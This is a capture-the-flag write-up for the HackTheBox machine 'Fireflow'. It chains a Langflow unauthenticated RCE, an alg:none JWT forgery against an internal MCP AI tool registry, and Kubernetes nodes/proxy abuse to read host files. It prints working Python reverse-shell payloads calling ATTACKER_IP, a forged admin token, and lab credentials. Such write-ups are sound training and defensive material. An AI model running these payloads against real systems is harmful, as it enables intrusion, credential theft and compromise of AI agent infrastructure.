# HackTheBox — Fireflow (Insane)

**Target:** `fireflow.htb` — `10.129.22.92`
**OS:** Ubuntu 24.04 LTS (kernel `6.8.0-111-generic`), single-node **k3s** Kubernetes cluster
**Difficulty:** Insane
**Reference:** [iamleandrooooo's Fireflow full-pwn writeup](https://iamleandrooooo.github.io/posts/fireflow_fullpwn/) was used as a guide and adapted below.

## TL;DR Attack Chain

```
Port scan → HTTPS vhost fireflow.htb, cert issued by "Task Force Nightfall"
   → Web app is an AI Agent chatbot built on Langflow 1.8.2
   → CVE-2026-33017: /api/v1/build_public_tmp/{flow_id}/flow is reachable unauthenticated
   → AUTO_LOGIN grabs a superuser token → create a PUBLIC flow → build it with a
     malicious custom Component whose "code" field is a reverse shell
   → RCE as www-data on the host
   → Langflow env vars leak LANGFLOW_SUPERUSER_PASSWORD → password reuse → SSH as nightfall
   → user.txt
   → Host runs k3s; nightfall has no kubeconfig access, no sudo, no docker-group win
   → Enumerate internal cluster network (10.42.0.0/16 pod CIDR) → find an internal-only
     "MCP AI Tool Registry" FastAPI service
   → Its JWT auth accepts alg "none" → forge an unsigned admin JWT
   → Register a malicious "tool" whose code is executed server-side when invoked
   → Invoke the tool via the MCP JSON-RPC endpoint → RCE inside the mcp-server pod
   → Pod's auto-mounted ServiceAccount token grants `get` on `nodes/proxy`
   → Abuse nodes/proxy to list every pod on the node via the kubelet API directly
   → Find the node-exporter DaemonSet pod (host `/` bind-mounted at `/host`)
   → websocat into the kubelet exec websocket for that pod, authenticated with the
     stolen SA token → `cat /host/root/root/root.txt`
   → root.txt, without ever getting an actual shell on the host as root
```

---

## 1. Reconnaissance

### 1.1 Port scan

```bash
export IP=10.129.22.92
rustscan --ulimit 10000 -a $IP -- -sCTVU -Pn -O
```

```
PORT    STATE  SERVICE  VERSION
22/tcp  open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
443/tcp open   ssl/http nginx
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
|_http-title: Did not follow redirect to https://fireflow.htb/
```

A wildcard cert (`*.fireflow.htb`) is a strong hint that subdomains matter here. Added `fireflow.htb` to `/etc/hosts`.

A follow-up full TCP scan also showed a handful of **filtered** high ports:

```
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite
```

Ports in the `30000–32767` range are the default **Kubernetes NodePort** range — a signal (confirmed much later) that this box is backed by a Kubernetes cluster, even though nothing on those ports responds directly from outside.

### 1.2 The web app

`https://fireflow.htb/` presents an "AI Agent" chatbot interface. Clicking the **Open Agent** button reveals, in the bottom-left corner of the agent-builder UI, that the app is built with **Langflow**.

> **Verification gap:** the exact banner/UI element that discloses the Langflow version (`1.8.2`) should be re-screenshotted and documented precisely when reproducing this box, since it's the trigger for the whole chain.

---

## 2. Initial Access — Langflow Unauthenticated RCE (CVE-2026-33017)

Langflow has a known history of unauthenticated RCE issues:

- **CVE-2025-3248** — RCE via `/api/v1/validate/code`, fixed in 1.3.0.
- **CVE-2026-33017** — RCE via `/api/v1/build_public_tmp/{flow_id}/flow`, fixed in 1.8.2... except the target is *running* 1.8.2, and the endpoint still accepts unauthenticated requests for public flows (per Langflow's advisory: *"The POST /api/v1/build_public_tmp/{flow_id}/flow endpoint allows building public flows without requiring authentication"* — [GHSA-vwmf-pq79-vjvx](https://github.com/advisories/GHSA-vwmf-pq79-vjvx)).

### 2.1 Grab a superuser token for free

Langflow ships with `AUTO_LOGIN=true` by default, which mints a superuser session with **no credentials required**:

```bash
TOKEN=$(curl -s https://$IP:7860/api/v1/auto_login | jq -r '.access_token')
```

### 2.2 Create a PUBLIC flow

```bash
FLOW_ID=$(curl -s -X POST https://$IP:7860/api/v1/flows/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","data":{"nodes":[],"edges":[]},"access_type":"PUBLIC"}' \
  | jq -r '.id')
echo "Public Flow ID: $FLOW_ID"
```

### 2.3 Trigger RCE via `build_public_tmp`

Because the flow is `PUBLIC`, its **build** endpoint doesn't require authentication at all — so a malicious custom Component's `code` field is executed server-side the moment the flow is built. See `scripts/langflow_exploit.sh` for the full payload; the core idea is a custom Langflow `Component` whose `code` template contains a raw Python reverse shell that runs at import/instantiation time:

```python
import socket,os,pty
_s=socket.socket()
_s.connect(("ATTACKER_IP",4444))
os.dup2(_s.fileno(),0); os.dup2(_s.fileno(),1); os.dup2(_s.fileno(),2)
pty.spawn("/bin/bash")

from langflow.custom import Component
from langflow.io import Output
from langflow.schema import Data

class ExploitComp(Component):
    display_name="X"
    outputs=[Output(display_name="O",name="o",method="r")]
    def r(self)->Data:
        return Data(data={})
```

```bash
nc -lvnp 4444
```

```
www-data@fireflow:/var/lib/langflow$ id
uid=33(www-data) gid=33(www-data)
```

RCE achieved as `www-data`.

---

## 3. Credential Harvesting → User Flag

Langflow's data directory and environment leak credentials directly:

```bash
www-data@fireflow:/var/lib/langflow$ cat secret_key
XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE

www-data@fireflow:~$ env | grep -iE "password|secret|key|token|db_|database"
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

The Langflow superuser password is reused as the Linux password for the host's real user, **nightfall** (matching the "Task Force Nightfall" branding seen in the TLS cert earlier):

```bash
ssh nightfall@fireflow.htb
# password: n1ghtm4r3_b4_n1ghtf4ll
```

```bash
nightfall@fireflow:~$ cat user.txt
29f661f5ea53721f00acb9a67a584cf1
```

```bash
nightfall@fireflow:~$ sudo -l
Sorry, user nightfall may not run sudo on fireflow.
```

No sudo rights — privilege escalation has to go through the Kubernetes cluster running on this host.

---

## 4. Dead Ends — Direct k3s / kubectl Access

The host runs **k3s** (lightweight Kubernetes). A few obvious avenues were tried and closed off:

```bash
nightfall@fireflow:~$ kubectl get pods --all-namespaces
error: error loading config file "/etc/rancher/k3s/k3s.yaml": open /etc/rancher/k3s/k3s.yaml: permission denied
```

`k3s.yaml` (the cluster admin kubeconfig) is `root:root 0600` — unreadable by `nightfall`. `nightfall` is in the `docker` group per `/etc/group`, but there's no Docker daemon socket to abuse here (the container runtime is containerd, driven by k3s, not a standalone dockerd).

```bash
nightfall@fireflow:~$ cat /proc/$(pgrep metrics-server)/root/var/run/secrets/kubernetes.io/serviceaccount/token
# empty — tmpfs mount not actually readable through /proc/<pid>/root this way
```

Attempting to read another process's mounted ServiceAccount token via `/proc/<pid>/root/...` came back empty — a dead end.

`/etc/rancher/k3s/config.yaml` *was* readable, though, and showed:

```yaml
disable:
  - traefik
```

Confirming Traefik is disabled (explaining why nothing interesting showed up on the earlier NodePort scan — no ingress controller is listening externally).

---

## 5. Pivoting Into the Cluster — MCP Tool Registry JWT `alg:none` Bypass

Interface enumeration (`ifconfig`) revealed the pod network:

```
cni0:      10.42.1.1/24    (flannel pod CIDR)
flannel.1: 10.42.1.0
eth0:      10.129.22.92    (host/external)
```

Kubernetes' default service CIDR in k3s is `10.43.0.0/16`. Probing that range internally from the `nightfall` shell turned up an internal-only FastAPI service:

```bash
curl http://10.43.250.195:8080/openapi.json
```

```json
{"info":{"title":"MCP AI Tool Registry — Task Force Nightfall","version":"0.1.0"},
 "paths":{
   "/api/v1/auth":       {"post": "..."},
   "/api/v1/tools":      {"get": "...", "post": "... [admin, Bearer JWT]"},
   "/mcp":               {"post": "... [Bearer JWT, MCP JSON-RPC 2.0]"}
 }}
```

```bash
curl http://10.43.250.195:8080/api/v1/version
```

```json
{"service":"MCP AI Tool Registry","version":"0.1.0",
 "auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]}}
```

> **Verification gap:** the exact enumeration path that surfaced the ClusterIP `10.43.250.195` specifically (vs. any other in-cluster service) should be re-walked and documented — e.g. via a DNS query against k3s' CoreDNS, a `/proc/*/environ` grep for injected `SERVICE_HOST`/`SERVICE_PORT` variables, or straightforward subnet sweeping. The notes jump straight to a working IP.

That `supported_algorithms` field listing **`"none"`** alongside `HS256` is the vulnerability: the service's JWT verification honors the unsigned `alg: none` algorithm, meaning **any client can mint a token claiming to be any user with any role — no key required.**

### 5.1 Forge an admin JWT

```bash
JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
# header:  {"alg":"none","typ":"JWT"}
# payload: {"sub":"admin","role":"admin"}
# signature: <empty>
```

```bash
curl http://10.43.250.195:8080/api/v1/tools -H "Authorization: Bearer $JWT"
```

```json
[{"name":"ping_host", ...},{"name":"get_metrics_summary", ...},{"name":"list_running_tasks", ...}]
```

Works — full admin access with zero credentials.

### 5.2 Register a malicious "tool"

The registry's `POST /api/v1/tools` [admin] endpoint accepts a `code` field for a new tool. Given the naming ("MCP AI Tool Registry"), this is designed to let an LLM agent dynamically register callable tools — meaning the server executes arbitrary submitted code when that tool is invoked:

```bash
curl -sk -X POST http://10.43.250.195:8080/api/v1/tools \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT" \
  -d '{
    "name":"pwn2","description":"x","inputSchema":{},
    "code":"import subprocess,os;subprocess.Popen([\"python3\",\"-c\",\"import socket,os,pty;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)"
  }'
```

### 5.3 Invoke it via the MCP JSON-RPC endpoint

```bash
curl -s http://10.43.250.195:8080/mcp \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"pwn2","arguments":{}}}'
```

```bash
nc -lvnp 4444
```

```
mcp@mcp-server-54464cb475-29ztf:/app$ id
```

RCE inside the `mcp-server` pod, running as user `mcp`, in the `default` namespace.

Full reusable exploit script: `scripts/mcp_jwt_bypass.sh`.

---

## 6. Kubernetes Privilege Escalation — Abusing `nodes/proxy`

Every pod on the cluster has a ServiceAccount token auto-mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. Check what this pod's identity (`system:serviceaccount:default:mcp-sa`) is actually allowed to do:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://10.43.0.1:443"

curl -sk -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

The `mcp-sa` ServiceAccount's RBAC rules include:

```json
{"verbs":["get"],"apiGroups":[""],"resources":["nodes/proxy"]}
```

**`get` on `nodes/proxy` is a well-known Kubernetes privilege-escalation primitive.** It lets the caller proxy arbitrary requests straight to a node's **kubelet API** (port `10250`) — bypassing normal Kubernetes RBAC/admission entirely, because the kubelet's own HTTP API doesn't re-check the same authorization rules for things like `exec`. Anyone with `nodes/proxy` `get` can effectively:

- List every pod running on that node (`kubelet`'s own `/pods` endpoint), and
- **`exec` into any container on that node** — including pods this ServiceAccount was never granted direct RBAC access to.

### 6.1 Enumerate pods on the node via the kubelet proxy

```bash
NODE_NAME="fireflow"   # decoded from the pod's own JWT (kubernetes.io.node.name claim)

curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/nodes/$NODE_NAME/proxy/pods" | \
  python3 -c 'import sys,json;d=json.load(sys.stdin);[print(i["metadata"]["namespace"],i["metadata"]["name"]) for i in d["items"]]'
```

```
kube-system   coredns-76c974cb66-cn7l6
kube-system   local-path-provisioner-8686667995-lp9th
kube-system   metrics-server-c8774f4f4-phw6q
monitoring    prometheus-kube-state-metrics-7c8c787854-25j6q
monitoring    prometheus-server-867bb4fcfd-m4t59
default       mcp-server-54464cb475-29ztf
monitoring    prometheus-prometheus-node-exporter-nmntq
```

`prometheus-prometheus-node-exporter-nmntq` stands out: **node-exporter** is a Prometheus DaemonSet that, by design, bind-mounts the **host's root filesystem** into the container (commonly at `/host`) so it can report host-level metrics. A shell inside that container is effectively a shell on the host filesystem.

### 6.2 Exec into node-exporter via the kubelet websocket API

The kubelet exposes `exec` over a websocket (`v4.channel.k8s.io` subprotocol). Rather than going through `kubectl` (which isn't configured), talk to it directly with **websocat**, still authenticating with the stolen `mcp-sa` token — the `nodes/proxy` grant is what makes this reachable at all:

```bash
# stage websocat into the pod (not preinstalled)
curl -o websocat http://ATTACKER_IP:5002/websocat
chmod +x websocat

POD="prometheus-prometheus-node-exporter-nmntq"

./websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://10.129.22.92:10250/exec/monitoring/${POD}/node-exporter?output=1&error=1&command=cat&command=/host/root/root/root.txt"
```

```
f79828df6e85077ba1cd8478b47dd6e2
{"metadata":{},"status":"Success"}
```

**root.txt recovered — without ever obtaining an interactive root shell on the underlying host.** The kubelet API executed the command inside the node-exporter container's mount namespace, which has the host's `/` bind-mounted at `/host`, so `/host/root/root/root.txt` on the container maps straight to `/root/root.txt` on the real host.

Full reusable exploit script: `scripts/k8s_node_proxy_root.sh`.

---

## Flags

| Flag | Value |
|---|---|
| user.txt (nightfall) | `29f661f5ea53721f00acb9a67a584cf1` |
| root.txt | `f79828df6e85077ba1cd8478b47dd6e2` |

---

## Root Cause Summary

| # | Weakness | Impact |
|---|---|---|
| 1 | Langflow's `build_public_tmp` endpoint executes flow code for **public** flows without authentication, even on a version advertised as patched | Unauthenticated RCE as `www-data` |
| 2 | `AUTO_LOGIN=true` mints a superuser session token with zero credentials | Attacker can create/manage flows with full privileges pre-exploit |
| 3 | Application secrets (`LANGFLOW_SUPERUSER_PASSWORD`) exposed via environment variables readable by the compromised web-app user, and reused as a real Linux account password | Password reuse turned web RCE into a full SSH foothold as `nightfall` |
| 4 | Internal-only "MCP AI Tool Registry" service accepts the JWT `alg:none` algorithm | Trivial authentication bypass — anyone can forge an admin token with no key |
| 5 | The tool registry executes arbitrary user-submitted `code` when a registered "tool" is invoked | RCE inside the `mcp-server` pod |
| 6 | The `mcp-sa` ServiceAccount was granted `get` on `nodes/proxy` | Full compromise of node-level isolation — arbitrary `exec` into *any* pod on the node via the kubelet API, bypassing normal per-pod RBAC |
| 7 | `node-exporter` DaemonSet bind-mounts the host root filesystem into the container (standard Prometheus practice, but a serious blast-radius multiplier if any path to `exec` into it exists) | Direct host file read (`root.txt`) from inside a container |

## Tools Used

- `rustscan` / `nmap` — port & service scanning
- `curl` / `jq` — Langflow REST API interaction & exploitation
- Custom Langflow `Component` payload — RCE via `build_public_tmp`
- `nc` — reverse shell catchers
- `curl` — internal cluster service discovery & MCP tool-registry exploitation
- Hand-forged `alg:none` JWT — MCP tool registry auth bypass
- `kubectl` — initial (unsuccessful) direct cluster access attempts
- Kubernetes `selfsubjectrulesreviews` API — RBAC self-enumeration
- `websocat` — raw kubelet `exec` websocket client for the final `nodes/proxy` pivot

## Repo Contents

```
.
├── README.md          # this writeup
└── scripts/
    ├── langflow_exploit.sh       # Section 2 — Langflow unauthenticated RCE
    ├── mcp_jwt_bypass.sh         # Section 5 — JWT alg:none forge + tool-registry RCE
    └── k8s_node_proxy_root.sh    # Section 6 — nodes/proxy → kubelet exec → root.txt
```

> **Note:** IPs, tokens, JWTs, and secrets in this writeup are specific to this HackTheBox instance and are already rotated/inert. `ATTACKER_IP` / `LHOST` placeholders in the scripts need to be set to your own tun0/VPN address before use.
